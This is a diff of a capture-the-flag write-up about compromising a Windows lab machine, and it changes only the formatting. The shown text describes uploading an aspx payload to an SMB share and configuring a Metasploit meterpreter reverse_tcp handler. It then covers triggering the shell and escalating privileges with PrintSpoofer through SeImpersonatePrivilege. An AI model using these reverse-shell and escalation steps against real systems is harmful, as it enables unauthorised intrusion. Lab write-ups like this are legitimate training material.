@@ -27,11 +27,11 @@ To get the info on arch google the service info form the nmap scan.
 We upload this to nt4wrksv share using the `put` command.
 Now we set up a handler on metasploit.
 
-`use exploit/multi/handler
- set payload windows/x64/meterpreter/reverse_tcp
- set lhost tun0
- set lport 4444
- run
+`use exploit/multi/handler  
+ set payload windows/x64/meterpreter/reverse_tcp  
+ set lhost tun0  
+ set lport 4444  
+ run  
 `
 
 Now that we have this setup we can trigger the rev.aspx either by a curl command or by manually going there in a web browser.
@@ -43,7 +43,7 @@ The reason I used a meterpreter shell rather than a normal reverse shell is beca
 We get a meterpreter shell now. We can navigate over to `C:/Users/Bob/` where we have our user.txt file.
 
 ## Privilege Escalation
-if we see the whoami /priv , it will list all privileges accessible for the user Bob.
+if we see the `whoami /priv` , it will list all privileges accessible for the user Bob.
 
 We can see here that `SeImpersonatePrevilige` is enabled. Hence, we can a use a tool called [printspoofer](https://github.com/dievus/printspoofer) to get root access.
 
